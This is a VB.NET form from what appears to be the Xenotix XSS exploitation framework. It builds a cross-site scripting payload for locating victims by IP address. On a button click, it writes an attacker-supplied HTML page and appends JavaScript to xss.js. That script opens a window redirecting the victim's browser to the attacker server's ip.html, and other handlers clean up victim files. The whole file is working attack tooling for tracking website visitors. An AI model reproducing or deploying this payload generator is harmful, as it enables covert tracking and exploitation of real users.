Imports System.IO

Public Class xss_info_ip2location

    Private Sub Button1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
        On Error Resume Next
        Dim ran = New Random()
        Dim tmp = ran.Next(410, 500)

        Timer1.Enabled = True
        Dim x As String = TextBox1.Text
        System.IO.File.WriteAllText(Application.StartupPath & "\ip.html", x.Replace("XSERVERX", xss_server.server_ip))
        Dim stream As New IO.StreamWriter(Application.StartupPath & "\xss.js", append:=True)
        stream.WriteLine("if (document.getElementById('xenotix_msg" & Str(tmp) & "') == null){ ")
        stream.WriteLine("document.write(window.open('','_new').location.replace('http://" + xss_server.server_ip + "/ip.html'));")
        stream.WriteLine("script = document.createElement('script');script.id = 'xenotix_msg" & Str(tmp) & "'; document.body.appendChild(script); }")

        stream.Close()
    End Sub


    Private Sub xss_info_victim_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        On Error Resume Next
        IO.File.Delete("victim.png")
        IO.File.Delete("ip.html")
    End Sub

    Private Sub Button2_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button2.Click
        On Error Resume Next
        IO.File.Delete("xss.js")
        IO.File.Delete("victim.png")
        IO.File.Delete("ip.html")
        Me.Close()
    End Sub

    Private Sub TextBox1_TextChanged(ByVal sender As System.Object, ByVal e As System.EventArgs)

    End Sub

    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        Try
            WebBrowser1.Navigate(Application.StartupPath & "\victim.html")
        Catch

        End Try

    End Sub
End Class